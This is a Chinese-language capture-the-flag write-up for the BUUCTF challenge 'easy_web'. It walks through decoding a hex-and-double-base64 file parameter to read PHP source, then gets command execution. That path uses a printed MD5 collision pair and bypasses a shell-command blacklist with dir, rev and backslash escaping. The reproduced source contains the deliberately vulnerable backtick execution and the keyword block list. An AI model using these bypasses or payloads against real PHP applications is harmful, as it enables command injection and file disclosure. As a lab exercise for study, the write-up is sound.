日期：2026/5/12       名称：[安洵杯 2019]easy_web         平台：BUUCTF
攻击过程：
        第一步：进入页面，如下，可以看到自动添加img参数为TXpVek5UTTFNbVUzTURabE5qYz0，猜测应该是某个文件的编码或者hash加密的值，又能看到左上角的图片（表情包）是
                <img src="data:image/gif;base64,iVBORw0K....">,猜测img是某个文件路径的加密结果，然后后端会使用file_get_contents获取文件内容，
                所以：暂定这个漏洞为SSRF
        <img width="2211" height="1034" alt="image" src="https://github.com/user-attachments/assets/bd1e53fd-3f95-47cb-9164-cb528fd0e344" />
        第二步：先猜测TXpVek5UTTFNbVUzTURabE5qYz0是base64编码的，使用在线解码它，连续解码两次成功得到3535352e706e67，感觉是某个文件字符串的16进制编码，之后解码得到555.png，所以得到结论：他会先对文件                  名转换为16进制再进行两次base64编码
        第三步：传入index.php的编码TmprMlJUWTBOalUzT0RKRk56QTJPRGN3,成功得到源码，如下：
                <?php
                error_reporting(E_ALL || ~ E_NOTICE);
                header('content-type:text/html;charset=utf-8');
                $cmd = $_GET['cmd'];
                if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
                    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
                $file = hex2bin(base64_decode(base64_decode($_GET['img'])));
                
                $file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
                if (preg_match("/flag/i", $file)) {
                    echo '<img src ="./ctf3.jpeg">';
                    die("xixi～ no flag");
                } else {
                    $txt = base64_encode(file_get_contents($file));
                    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
                    echo "<br>";
                }
                echo $cmd;
                echo "<br>";
                if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\                        (|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
                    echo("forbid ~");
                    echo "<br>";
                } else {
                    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
                        echo `$cmd`;
                    } else {
                        echo ("md5 is funny ~");
                    }
                }
                
                ?>
                <html>
                <style>
                  body{
                   background:url(./bj.png)  no-repeat center center;
                   background-size:cover;
                   background-attachment:fixed;
                   background-color:#CCCCCC;
                }
                </style>
                <body>
                </body>
                </html>
        第四步：查看源码，看来我们想使用第三步的方法得到flag文件内容无用，因为他会先preg_replace将我们上传的img的解码字符串变得只有字母数字和.组成，之后于又来一个正则表达式匹配flag来禁止我们查看flag。
                除此之外，我们还无法得到flag的路径
        第五步：在cmd参数做文章，可以看到if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))是强类型比较，很难绕过，即便我传入a和b是数组也不行，因为第一个                    条件就false。
        第六步：使用生日碰撞得到a和b，然后因为 echo `$cmd`，在php中反引号会把内部的字符串当作shell执行，可以把它看作shell_exec函数。最后只用绕过                                                                      (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\                        (|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd))
        第七步：绕过方法为使用dir代替ls，使用rev替代cat（rev会把结果倒着输出），最终成功
        补充：我查看网上有大佬解释，正则表达式匹配|\\|\\\\|时候会经过两次解析，一次是php解析字符串成为|\|\\|，第二次正则表达式解析只匹配|\字段，意味着可以使用使用\，所以上传l\s也可以成功
        还有生日碰撞的a和b可以在网上找到：   a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07 %fe%a2
                b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2




关于生日攻击：
        请查看：

        
        
                        
                
                        
